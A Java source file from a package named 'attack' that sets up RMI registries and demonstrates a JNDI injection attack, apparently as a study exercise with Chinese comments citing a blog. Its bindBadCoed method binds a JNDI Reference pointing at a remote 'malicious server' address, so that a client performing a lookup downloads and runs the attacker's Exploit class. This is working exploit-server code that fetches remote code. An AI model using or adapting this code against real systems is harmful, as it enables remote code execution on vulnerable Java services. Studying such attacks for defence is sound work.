package com.tansun.attack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import java.net.MalformedURLException;
import java.rmi.AlreadyBoundException;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

/**
 * JNDI攻击
 * https://blog.csdn.net/qq_33020901/article/details/98472921
 * 利用RMI（远程方法调用）
 */
public class RMIRegistryServer {


    public boolean registryObj() throws RemoteException, AlreadyBoundException, MalformedURLException {

        IHello rhello = new HelloImpl();
        // 创建一个rmi映射表
        Registry registry = LocateRegistry.createRegistry(1099);
        // 注册远程对象名称
//        registry.bind("hello", (Remote)rhello);
        // 注册远程对象名称，与客户端的通信端口
        Naming.bind("rmi://127.0.0.1:1099/hello", (Remote)rhello);

        return true;
    }


    public Context rmiRegistryTable() throws NamingException, RemoteException, AlreadyBoundException, MalformedURLException {

        Hashtable envInit = new Hashtable();
//        Properties envInit = new Properties();
        envInit.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        // 该属性，有可能会被后面的地址覆盖,RMI注册表 服务的监听端口1099
        envInit.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        // 入参Hashtable或其子类
        Context context = new InitialContext(envInit);

        // 注册远程对象名称
        IHello rhello = new HelloImpl();

        // 创建一个rmi映射表，与客户端的通信端口8080
        Registry registry = LocateRegistry.createRegistry(8080);
//        registry.bind("test", (Remote)rhello);
        // 注册远程对象名称,最终也会调用 registry.bind("test", (Remote)rhello);
        Naming.bind("rmi://127.0.0.1:8080/test", (Remote)rhello);
        return context;
    }

    public void bindBadCoed() throws RemoteException, NamingException, AlreadyBoundException {
        System.setProperty("java.rmi.server.hostname","127.0.0.1");
        Registry registry = LocateRegistry.createRegistry(1099);

        // 远程恶意服务器
        String remote_class_server = "http://192.168.189.130:8097/";
        Reference reference = new Reference("Exploit", "Exploit", remote_class_server);
        //reference的factory class参数指向了一个外部Web服务的地址
        /* 高版本不可加载该类，进行JNDI攻击 */
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        // 去远程恶意服务器上 下载代码
        registry.bind("attackCode", referenceWrapper);
    }
}
